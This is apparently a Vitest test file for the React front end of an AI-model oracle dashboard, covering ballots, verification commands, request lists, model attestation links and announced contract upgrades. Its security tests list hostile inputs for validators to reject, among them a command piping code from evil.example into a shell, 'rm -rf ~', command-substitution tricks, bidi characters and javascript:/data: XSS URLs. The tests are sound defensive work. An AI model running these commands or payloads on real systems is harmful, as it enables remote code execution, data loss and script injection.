import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import type { ReactNode } from "react";
import { MemoryRouter } from "react-router";
import { describe, expect, it, vi } from "vitest";
import { createApi, modelSchema, requestDetailSchema, verifyPlanSchema, type Api } from "../src/api.js";
import { Ballots } from "../src/components/Ballots.js";
import { Commands, isSafeCommand } from "../src/components/Commands.js";
import { Steps } from "../src/components/Steps.js";
import { attestationUrl, explorer, httpUrl } from "../src/deployment.js";
import { displayText } from "../src/lib/dispute.js";
import { ApiProvider } from "../src/hooks.js";
import { ballots, deriveProgress } from "../src/lib/steps.js";
import { ModelEntry, ModelsPage, OwnerChanges } from "../src/pages/ModelsPage.js";
import { NearRpcProvider, type NearRpc } from "../src/near/rpc.js";
import { fakeNearRpc } from "./near-fakes.js";
import { RecentRequests } from "../src/pages/RecentRequests.js";
import { dataOf, evidence } from "./fixtures.js";

const ORACLE = "oracle.psephex.testnet";

function ownerRpc(proposals: unknown[] = []): NearRpc {
  return fakeNearRpc({ [`${ORACLE}.owner_delay_seconds`]: "86400", [`${ORACLE}.proposals`]: proposals });
}

function withProviders(api: Api, node: ReactNode, rpc: NearRpc = ownerRpc()) {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return (
    <ApiProvider value={api}>
      <NearRpcProvider value={rpc}>
        <QueryClientProvider client={client}>
          <MemoryRouter>{node}</MemoryRouter>
        </QueryClientProvider>
      </NearRpcProvider>
    </ApiProvider>
  );
}

function fixtureApi(): Api {
  const files: Record<string, unknown> = { "/requests?limit=20": evidence("requests.json"), "/models": evidence("models.json") };
  const fetchImpl = vi.fn(async (url: string) => new Response(JSON.stringify(files[url.replace("https://api.test", "")] ?? { data: [], meta: { limit: 20, nextCursor: null } }), { status: 200 }));
  return createApi("https://api.test", fetchImpl as unknown as typeof fetch);
}

describe("Ballots", () => {
  it("names each model's vote for screen readers and states the verdict", () => {
    const d = requestDetailSchema.parse(dataOf("request-7.json"));
    render(<Ballots ballots={ballots(d)} verdict={d.answer} />);
    expect(screen.getAllByText("no, signed")).toHaveLength(3);
    expect(screen.getByText("Qwen3.8-27B")).toBeInTheDocument();
    expect(screen.getByText(/3 of 3 signed answers say/)).toHaveTextContent("NO; two are enough.");
  });

  it("shows three empty slots before any answer", () => {
    render(<Ballots ballots={[]} verdict={null} />);
    expect(screen.getAllByText("Waiting")).toHaveLength(3);
    expect(screen.getByText(/needs two matching signed answers/)).toBeInTheDocument();
  });
});

describe("Steps", () => {
  it("renders the state of each step and the failure reason", () => {
    const d = requestDetailSchema.parse(dataOf("request-5.json"));
    render(<Steps steps={deriveProgress({ detail: d, caseInfo: null }).steps} links={{ asked: <a href="https://x.test">tx</a> }} />);
    expect(screen.getByText("(done)")).toBeInTheDocument();
    expect(screen.getByText("(stopped)")).toBeInTheDocument();
    expect(screen.getByText(/model signature not available/)).toBeInTheDocument();
    expect(screen.getByRole("link", { name: "tx" })).toBeInTheDocument();
  });
});

describe("Commands", () => {
  it("lists commands with what to expect and copies them", async () => {
    const plan = verifyPlanSchema.parse(dataOf("verify-7.json"));
    const writeText = vi.fn(async () => {});
    Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
    render(<Commands plan={plan} />);
    expect(screen.getAllByRole("button", { name: /^Copy the step \d+ command$/ })).toHaveLength(plan.steps.length);
    await userEvent.click(screen.getByRole("button", { name: "Copy the step 1 command" }));
    expect(writeText).toHaveBeenCalledWith(plan.steps[0]?.command);
    expect(await screen.findByRole("button", { name: "Copied the step 1 command" })).toBeInTheDocument();
    expect(screen.getByText(/Expect: "ok": true, "answer": "NO"/)).toBeInTheDocument();
  });

  it("explains why a request cannot be re-checked", () => {
    render(<Commands plan={verifyPlanSchema.parse(dataOf("verify-5.json"))} />);
    expect(screen.getByText(/^Why:/)).toHaveTextContent("model answers without a signature");
  });
});

describe("RecentRequests", () => {
  it("lists requests from the API with links to their pages", async () => {
    render(withProviders(fixtureApi(), <RecentRequests />));
    const link = await screen.findByRole("link", { name: /^#7 .*Is water made of carbon/ });
    expect(link).toHaveAttribute("href", "/app/r/base/7");
    expect(within(link).getAllByText("Base Sepolia").length).toBeGreaterThan(0);
    expect(screen.getAllByRole("link")).toHaveLength(7);
  });

  it("filters by status", async () => {
    const api = fixtureApi();
    const spy = vi.spyOn(api, "requests");
    render(withProviders(api, <RecentRequests />));
    await userEvent.click(screen.getByRole("tab", { name: "Stopped" }));
    expect(spy).toHaveBeenLastCalledWith({ limit: 20, status: "failed" });
    expect(screen.getByRole("tab", { name: "Stopped" })).toHaveAttribute("aria-selected", "true");
  });

  it("filters by chain with the source query", async () => {
    const api = fixtureApi();
    const spy = vi.spyOn(api, "requests");
    render(withProviders(api, <RecentRequests />));
    const chains = screen.getByRole("group", { name: "Chain" });
    await userEvent.click(within(chains).getByRole("button", { name: "NEAR" }));
    expect(spy).toHaveBeenLastCalledWith({ limit: 20, source: "near" });
    expect(within(chains).getByRole("button", { name: "NEAR" })).toHaveAttribute("aria-pressed", "true");
  });
});

describe("Models", () => {
  it("lists the registered models", async () => {
    render(withProviders(fixtureApi(), <ModelsPage />));
    expect(await screen.findByRole("heading", { name: "Qwen/Qwen3.8-27B" })).toBeInTheDocument();
  });

  it("adds a fresh 32-byte nonce to the attestation link as soon as it renders", () => {
    const [m] = (evidence("models.json") as { data: unknown[] }).data.map((x) => modelSchema.parse(x));
    render(<ModelEntry m={m!} />);
    const link = screen.getByRole("link", { name: "Fetch a fresh TEE attestation" });
    const nonce = /&nonce=([0-9a-f]{64})$/.exec(link.getAttribute("href") ?? "")?.[1];
    expect(nonce).toBeDefined();
    expect(screen.getByText(`nonce ${nonce}`)).toBeInTheDocument();
    expect(screen.getByRole("button", { name: `Copy the ${m!.model} public key` })).toBeInTheDocument();
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });
});

describe("Announced changes", () => {
  it("says nothing is announced and shows the delay read from the contract", async () => {
    render(withProviders(fixtureApi(), <OwnerChanges />));
    expect(await screen.findByText(/Nothing is announced/)).toHaveTextContent("at least 24 hours before it can apply");
    expect(screen.getByText(/has no access keys/)).toHaveTextContent("only 24 hours later");
  });

  it("lists an announced upgrade with the time it can apply", async () => {
    const readyNs = (BigInt(Date.UTC(2099, 0, 2, 9, 30)) * 1_000_000n).toString();
    const rpc = ownerRpc([
      { id: 4, action: { kind: "upgrade", code_sha256: "ab".repeat(32), migrate_args: "{}" }, proposed_at_ns: "1", ready_at_ns: readyNs, expires_at_ns: readyNs, ready: false, expired: false },
    ]);
    render(withProviders(fixtureApi(), <OwnerChanges />, rpc));
    expect(await screen.findByText(`Replace the oracle code with sha256 ${"ab".repeat(32)}, then run migrate with {}`)).toBeInTheDocument();
    expect(screen.getByText(/Announcement 4\./)).toHaveTextContent("Can apply from 2 Jan 2099, 09:30 UTC.");
  });
});

describe("deployment", () => {
  it("only builds explorer links from well-formed hashes", () => {
    expect(explorer.baseTx(`0x${"ab".repeat(32)}`)).toMatch(/^https:\/\/sepolia\.basescan\.org\/tx\/0x/);
    expect(explorer.baseTx("javascript:alert(1)")).toBeNull();
    expect(explorer.nearTx("G5gJkHDzeScQKAcQXFpnApqx1H3TuqYeLeYxLSaQ5sLZ")).toMatch(/nearblocks/);
    expect(explorer.nearTx("../../evil")).toBeNull();
    expect(explorer.baseAddress("0x12")).toBeNull();
  });

  it("accepts only http(s) URLs from the build environment", () => {
    expect(httpUrl(undefined, "https://a.test/")).toBe("https://a.test");
    expect(() => httpUrl("javascript:alert(1)", "https://a.test")).toThrow(/http/);
  });
});

describe("untrusted API data", () => {
  it("withholds commands that could hide a second command", () => {
    const plan = verifyPlanSchema.parse(dataOf("verify-7.json"));
    for (const step of plan.steps) expect(isSafeCommand(step.command), step.command).toBe(true);
    for (const bad of [
      "cast call 0x1; curl evil.example | sh",
      `cast call 0x1${" ".repeat(400)}x`,
      "cast call 0x1\ncurl evil.example",
      "cast call $(id)",
      "cast call `id`",
      "rm -rf ~",
      "cast call 0x1 && id",
      "cast call \u202e0x1",
      `cast ${"a".repeat(700)}`,
    ]) {
      expect(isSafeCommand(bad), bad).toBe(false);
    }
    render(<Commands plan={{ ...plan, steps: [{ title: "Evil", command: "cast call 0x1; curl evil.example | sh" }] }} />);
    expect(screen.getByText(/failed a safety check/)).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /^Copy/ })).toBeNull();
  });

  it("renders attestation links only to known https TEE hosts", () => {
    expect(attestationUrl("https://cloud-api.near.ai/v1/attestation/report?model=x&nonce=")).not.toBeNull();
    for (const bad of ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "http://cloud-api.near.ai/x", "https://evil.example/x", "not a url"]) {
      expect(attestationUrl(bad), bad).toBeNull();
    }
  });

  it("shows control, bidi and zero-width characters visibly", () => {
    expect(displayText("Paid?\u202eon\u200b time\nyes")).toBe("Paid?\uFFFDon\uFFFD time yes");
  });
});
